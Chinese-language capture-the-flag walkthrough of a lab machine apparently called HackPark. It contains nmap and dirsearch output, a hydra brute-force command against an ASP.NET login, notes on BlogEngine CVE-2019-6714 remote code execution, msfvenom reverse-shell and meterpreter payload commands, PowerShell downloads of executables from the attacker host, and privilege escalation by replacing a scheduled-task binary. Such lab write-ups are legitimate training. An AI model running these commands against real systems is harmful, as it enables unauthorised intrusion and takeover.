# 服务扫描
```
nmap -sV -Pn -A 10.10.143.193
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-24 06:04 EDT
Nmap scan report for 10.10.143.193
Host is up (0.31s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2021-08-23T09:45:12
|_Not valid after:  2022-02-22T09:45:12
|_ssl-date: 2021-08-24T10:05:17+00:00; -1s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012 (98%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (98%), Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   171.12 ms 10.13.0.1
2   ... 3
4   309.74 ms 10.10.143.193

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds
```

# 小丑名字
根据图片，放到谷歌中搜索，小丑回魂2，剧中小丑的名字：Pennywise


# 爆破目录
```
#  python3 dirsearch.py -u http://10.10.143.193 -e *                                              

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6099

Error Log: /root/dirsearch/logs/errors-21-08-24_06-13-39.log

Target: http://10.10.143.193

[06:13:40] Starting: 
[06:13:42] 403 -  312B  - /%2e%2e/google.com
[06:14:08] 301 -  152B  - /account  ->  http://10.10.143.193/account/            
[06:14:08] 403 -    1KB - /Account/            
[06:14:08] 403 -    1KB - /account/
[06:14:12] 500 -    2KB - /admin%20/                                 
[06:14:14] 500 -    2KB - /admin.                      
[06:14:14] 302 -  173B  - /admin  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/admin
[06:14:14] 302 -  173B  - /ADMIN  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/ADMIN
[06:14:14] 302 -  173B  - /Admin  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/Admin
[06:14:15] 302 -  174B  - /admin/  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/admin/
[06:14:15] 302 -  181B  - /admin/?/login  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/admin/?/login
[06:14:18] 302 -  179B  - /admin/index  ->  http://10.10.143.193/Account/login.aspx?ReturnURL=/admin/index  
[06:14:41] 500 -    1KB - /api/                                                                                   
[06:14:43] 200 -    8KB - /archive                           
[06:14:44] 200 -    8KB - /archiver      
[06:14:44] 200 -    8KB - /archives
[06:14:44] 301 -  158B  - /aspnet_client  ->  http://10.10.143.193/aspnet_client/
[06:14:52] 500 -    1KB - /blog                                                
[06:14:52] 500 -    1KB - /Blog
[06:14:52] 500 -    1KB - /blog/error_log
[06:14:52] 500 -    1KB - /blog/fckeditor
[06:14:52] 500 -    1KB - /blog/wp-content/backup-db/
[06:14:52] 500 -    1KB - /blog/wp-content/backups/
[06:14:52] 500 -    1KB - /blog/wp-login
[06:14:52] 500 -    1KB - /blog/wp-login.php
[06:15:04] 200 -   13KB - /contact                                             
[06:15:04] 200 -   13KB - /contact_us                
[06:15:04] 200 -   13KB - /contactus
[06:15:04] 301 -  152B  - /content  ->  http://10.10.143.193/content/
[06:15:04] 200 -   13KB - /contacts            
[06:15:11] 500 -    2KB - /Default                        
[06:15:11] 500 -    2KB - /default2.CHANGELOG.md
[06:15:11] 500 -    2KB - /DefaultWebApp
[06:15:11] 500 -    2KB - /default 
[06:15:23] 301 -  150B  - /fonts  ->  http://10.10.143.193/fonts/                                     
[06:15:38] 500 -    2KB - /javax.faces.resource.../WEB-INF/web.xml.jsf                                         
[06:16:17] 500 -    2KB - /rating_over.                                                                 
[06:16:20] 200 -  303B  - /robots.txt                      
[06:16:21] 301 -  152B  - /scripts  ->  http://10.10.143.193/scripts/                                   
[06:16:21] 403 -    1KB - /scripts/
[06:16:21] 301 -  152B  - /Scripts  ->  http://10.10.143.193/Scripts/                
[06:16:22] 200 -    8KB - /search_admin                                                
[06:16:22] 200 -    8KB - /search
[06:16:22] 200 -    8KB - /Search
[06:16:25] 302 -  175B  - /setup  ->  http://10.10.143.193/Account/login.aspx?ReturnUrl=%2fsetup                  
[06:16:25] 302 -  178B  - /setup/  ->  http://10.10.143.193/Account/login.aspx?ReturnUrl=%2fsetup%2f
[06:16:38] 500 -    2KB - /TechnologySamples/Calendar/                                              
[06:16:43] 200 -    8KB - /Trace.axd                                        
[06:16:51] 500 -    2KB - /WEB-INF./web.xml                          
                                                                                        
Task Completed                    
```

# 爆破登录密码,注意__VIEWSTATE和__EVENTVALIDATION这两个隐藏在页面的元素，也需要把他们的值提交

hydra -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.248.118 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=Dm1aKq8kfr0YaRND38UD/ACXHlMRS2ejVh/vsNHR91Tss4+m5teMCVxIWlDbOwsG8LDLps9QcTKeIkKEttafVYRLJ3knDpcy4ZyWgSX4bwKnxWyaPX4XOVBnBZBzSnzNh4OiLS9XgJvEb7wLFzEzFQrx7g92WE7dtanovGSWntP3hIfg&__EVENTVALIDATION=bXobeqArLseO60c3Mdy5+kw+t8gUCgXKMwrgihnfRoY8DwqXR3XneXuJInVFg8YAjEYaVOo/fCvZ/M/03H4iuIgLA4/pbd64b8pFX3WhVZc9k/kDmmJf9/yOlqGKfjNnlLCw3DXG7on3RZ2kGCx6D5eKCafnsItbabOVh5ARyDUwIglM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"


用户名：admin
密码:1qaz2wsx


# web软件
BlogEngine

# 版本号
3.3.6.0

# 漏洞号
CVE:
2019-6714
https://www.exploit-db.com/exploits/46353

# 利用方法
/*
 * CVE-2019-6714
 *
 * Path traversal vulnerability leading to remote code execution.  This 
 * vulnerability affects BlogEngine.NET versions 3.3.6 and below.  This 
 * is caused by an unchecked "theme" parameter that is used to override
 * the default theme for rendering blog pages.  The vulnerable code can 
 * be seen in this file:
 * 
 * /Custom/Controls/PostList.ascx.cs
 *
 * Attack:
 *
 * First, we set the TcpClient address and port within the method below to 
 * our attack host, who has a reverse tcp listener waiting for a connection.
 * Next, we upload this file through the file manager.  In the current (3.3.6)
 * version of BlogEngine, this is done by editing a post and clicking on the 
 * icon that looks like an open file in the toolbar.  Note that this file must
 * be uploaded as PostView.ascx. Once uploaded, the file will be in the
 * /App_Data/files directory off of the document root. The admin page that
 * allows upload is:
 *
 * http://10.10.10.10/admin/app/editor/editpost.cshtml
 *
 *
 * Finally, the vulnerability is triggered by accessing the base URL for the 
 * blog with a theme override specified like so:
 *
 * http://10.10.10.10/?theme=../../App_Data/files
 *
 */

# 编译一个稳定的shell，拿到meterpreter
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell.exe

# x64 meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe

# 从靶机下载到本地，注意要放到c:\Windows\Temp下，其他文件夹可能没有权限
powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/Message.exe' -OutFile 'c:\Windows\Temp\Message.exe'"

# msf 监听
1，use exploit/multi/handler 
2，set playload windows/meterpreter/reverse_tcp


# 提权到adminstrator。Message.exe文件每30秒会以adminstrator的身份执行一次。

1，编译木马文件反弹shell，文件名Message.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp  LHOST=10.13.21.169 LPORT=4445 -f exe > Message.exe

2，上传文件，替换定时任务文件，如果从meterpret中替换，会报权限不足，从shell直接上传不会有这个问题
powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"


run ost/multi/recon/local_exploit_suggester 

[-] The specified meterpreter session script could not be found: ost/multi/recon/local_exploit_suggester
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.151.70 - Collecting local exploits for x64/windows...
[*] 10.10.151.70 - 24 exploit checks are being tried...
[+] 10.10.151.70 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.151.70 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.10.151.70 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[-] 10.10.151.70 - Post failed: NoMethodError undefined method `reverse!' for nil:NilClass
[-] 10.10.151.70 - Call stack:
[-] 10.10.151.70 -   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:136:in `shell_command_token_win32'
[-] 10.10.151.70 -   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:84:in `shell_command_token'
[-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/exploits/windows/local/cve_2020_0787_bits_arbitrary_file_move.rb:96:in `check'
[-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:121:in `block in run'
[-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `each'
[-] 10.10.151.70 -   /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `run'




# 提权模块
exploit/windows/local/cve_2019_1458_wizardopium


# without msf
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.21.169 LPORT=4444 -f exe -o shell2.exe

# 下载到本地
powershell -c "Invoke-WebRequest -Uri 'http://10.13.21.169:8000/winPEAS.bat' -OutFile 'c:\Windows\Temp\winPEAS.bat'"